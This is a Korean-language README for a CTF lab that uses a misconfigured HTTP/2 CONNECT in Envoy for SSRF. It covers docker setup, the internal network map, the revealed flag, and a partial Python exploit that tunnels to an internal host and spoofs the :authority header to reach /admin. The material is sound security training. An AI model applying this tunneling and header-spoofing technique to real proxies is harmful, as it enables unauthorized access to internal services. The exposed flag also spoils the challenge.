# Playing with HTTP/2 CONNECT

## 기본 요약

HTTP/2 CONNECT 메서드의 취약한 설정을 이용한 SSRF(Server-Side Request Forgery) 공격 실습용 CTF/워게임 프로젝트입니다.

### 핵심 개념
- **HTTP/2 CONNECT**: TCP 터널링을 위한 HTTP/2 메서드
- **SSRF 취약점**: Envoy 프록시의 잘못된 CONNECT 설정으로 내부 네트워크 접근 가능
- **Host Header Confusion**: HTTP/2 :authority 헤더를 이용한 접근 제어 우회

### 학습 목표
- HTTP/2 프로토콜과 CONNECT 메서드 이해
- Envoy 프록시의 보안 설정 이해
- SSRF 공격 벡터 및 방어 기법 학습
- 내부 네트워크 침투 기법 실습

### 난이도
**Hard** - HTTP/2 프로토콜 지식과 Python 스크립팅 능력 필요

---

## 환경 디렉토리

```
Playing-with-HTTP-2-CONNECT/
├── README.txt                    # 참가자용 문제 설명 (블랙박스)
├── WRITEUP.md                    # 완전한 솔루션 가이드 (관리자용)
├── WRITEUP.ko.md                 # 솔루션 가이드 (한국어)
├── SETUP.md                      # 주최자용 설정 가이드
├── SETUP.ko.md                   # 설정 가이드 (한국어)
├── CLAUDE.md                     # 본 파일 - README 작성 가이드
├── docker-compose.yml            # 인프라 정의
├── .env.example                  # 환경 변수 예시
├── .gitignore                    # Git 제외 파일 목록
│
├── envoy/
│   └── envoy.yaml                # Envoy 프록시 설정 (취약점 포함)
│
├── backend/
│   ├── Dockerfile                # Backend 컨테이너 이미지
│   ├── requirements.txt          # Python 의존성
│   └── app.py                    # Flask 백엔드 (Flag 포함)
│
├── decoy1/
│   ├── Dockerfile                # 미끼 서비스 1
│   └── server.py                 # 가짜 데이터베이스 서비스
│
├── decoy2/
│   ├── Dockerfile                # 미끼 서비스 2
│   └── server.py                 # 가짜 분석 서비스
│
└── decoy3/
    ├── Dockerfile                # 미끼 서비스 3
    └── server.py                 # 가짜 모니터링 서비스
```

### 주요 파일 설명

| 파일 | 목적 | 대상 |
|------|------|------|
| `README.txt` | 최소한의 힌트만 제공하는 문제 설명 | 참가자 |
| `WRITEUP.md` | 2500+ 라인의 완전한 솔루션 | 관리자/사후 학습 |
| `SETUP.md` | 환경 구축 및 테스트 가이드 | 주최자 |
| `docker-compose.yml` | 5개 서비스, 2개 네트워크 정의 | 인프라 |
| `envoy/envoy.yaml` | 취약한 CONNECT 설정 | 핵심 취약점 |
| `backend/app.py` | Host 헤더 검증 로직 | 2차 취약점 |

---

## 실행 방법

### 사전 요구사항

- Docker 및 Docker Compose 설치
- 포트 10000 사용 가능
- 최소 512MB RAM 여유 공간

### 1. 환경 시작

```bash
# 프로젝트 디렉토리로 이동
cd Playing-with-HTTP-2-CONNECT

# Docker 컨테이너 빌드 및 시작
docker-compose up -d --build

# 서비스 상태 확인
docker-compose ps
```

예상 출력:
```
NAME                  STATUS
backend.acme.corp     Up
decoy1.database       Up
decoy2.analytics      Up
decoy3.monitoring     Up
envoy.proxy           Up
```

### 2. 접근성 테스트

```bash
# 프록시 접근 확인
curl http://localhost:10000/
```

성공 시 ACME Corp 백엔드 HTML 페이지가 반환됩니다.

### 3. 블랙박스 챌린지 시작

참가자에게는 **오직 README.txt만 제공**하고 문제를 풀도록 합니다.

```bash
# 참가자에게 제공할 파일
cat README.txt
```

### 4. 로그 모니터링 (주최자용)

```bash
# 실시간 프록시 로그 확인
docker-compose logs -f proxy

# 백엔드 접근 로그 확인
docker-compose logs -f backend
```

### 5. 환경 종료

```bash
# 서비스 중지
docker-compose down

# 서비스 중지 + 볼륨 삭제
docker-compose down -v
```

---

## 시연 & 작동 영상

### 공격 시연 영상
> 🎥 **Coming Soon**
> HTTP/2 CONNECT를 이용한 내부 네트워크 스캔 및 Flag 획득 과정

### 주요 시연 단계

1. **HTTP/2 지원 확인**
   - curl 또는 Python h2 라이브러리로 HTTP/2 연결 확인

2. **CONNECT 터널 생성**
   - 172.20.0.0/24 내부 네트워크 스캔
   - 활성 서비스 발견

3. **서비스 조사**
   - 각 서비스에 HTTP 요청 전송
   - /admin 엔드포인트 발견

4. **접근 제어 우회**
   - :authority 헤더 조작
   - internal.acme.corp로 설정하여 검증 우회

5. **Flag 획득**
   - `WSL{http2_authority_header_confusion}` 획득

### 스크린샷 예시

```
# 1. 내부 네트워크 스캔 결과
[*] 172.20.0.5:10000 - Status: 200
[*] 172.20.0.10:8080 - Status: 200
[*] 172.20.0.15:3000 - Status: 200
[*] 172.20.0.20:8000 - Status: 200
[*] 172.20.0.25:8888 - Status: 200

# 2. Flag 획득 성공
[✓] Exploit successful! Flag captured.
WSL{http2_authority_header_confusion}
```

### 시연 스크립트

Python exploit 예시:
```python
# test_exploit.py
from h2.connection import H2Connection
from h2.config import H2Configuration
import socket

# 1. HTTP/2 연결
sock = socket.create_connection(('localhost', 10000))
config = H2Configuration(client_side=True)
conn = H2Connection(config=config)
conn.initiate_connection()
sock.sendall(conn.data_to_send())

# 2. CONNECT 터널 생성
stream_id = conn.get_next_available_stream_id()
headers = [
    (':method', 'CONNECT'),
    (':authority', '172.20.0.10:8080'),
]
conn.send_headers(stream_id, headers)
sock.sendall(conn.data_to_send())

# 3. /admin 접근 (:authority 조작)
request_stream_id = conn.get_next_available_stream_id()
request_headers = [
    (':method', 'GET'),
    (':scheme', 'http'),
    (':authority', 'internal.acme.corp'),  # ← 핵심!
    (':path', '/admin'),
]
conn.send_headers(request_stream_id, request_headers, end_stream=True)
sock.sendall(conn.data_to_send())

# 4. Flag 수신
# ... (response handling code)
```

---

## 네트워크 구조

```
┌─────────────────────────────────────────────────┐
│             External Network (10.0.1.0/24)      │
│                                                 │
│  ┌───────────────────────────────────────┐     │
│  │  Envoy Proxy (10.0.1.10)              │     │
│  │  Port: 10000 (exposed to host)        │     │
│  └───────────────────────────────────────┘     │
│                      │                          │
└──────────────────────┼──────────────────────────┘
                       │
                       │ HTTP/2 CONNECT
                       │ (SSRF!)
                       ▼
┌─────────────────────────────────────────────────┐
│          Internal Network (172.20.0.0/24)       │
│                                                 │
│  ┌─────────────────┐  ┌─────────────────┐      │
│  │ Backend         │  │ Decoy1          │      │
│  │ 172.20.0.10     │  │ 172.20.0.15     │      │
│  │ Port: 8080      │  │ Port: 3000      │      │
│  │ (FLAG HERE!)    │  │ (Fake DB)       │      │
│  └─────────────────┘  └─────────────────┘      │
│                                                 │
│  ┌─────────────────┐  ┌─────────────────┐      │
│  │ Decoy2          │  │ Decoy3          │      │
│  │ 172.20.0.20     │  │ 172.20.0.25     │      │
│  │ Port: 8000      │  │ Port: 8888      │      │
│  │ (Fake Analytics)│  │ (Fake Monitor)  │      │
│  └─────────────────┘  └─────────────────┘      │
└─────────────────────────────────────────────────┘
```

---

## 추가 리소스

- **완전한 솔루션**: `WRITEUP.md` 참조
- **설정 가이드**: `SETUP.md` 참조
- **HTTP/2 사양**: [RFC 9113](https://www.rfc-editor.org/rfc/rfc9113.html)
- **Envoy 문서**: [envoyproxy.io](https://www.envoyproxy.io/)

---

## 라이선스 & 주의사항

이 프로젝트는 교육 목적으로만 사용되어야 합니다.

- ✅ CTF/워게임 대회
- ✅ 보안 교육 및 트레이닝
- ✅ 승인된 침투 테스트 학습
- ❌ 무단 시스템 공격
- ❌ 실제 인프라에 대한 악용

**면책 조항**: 본 프로젝트를 악의적 목적으로 사용하여 발생하는 모든 법적 책임은 사용자에게 있습니다.

---

**제작**: Claude Code
**날짜**: 2026-03-20
**버전**: 1.0
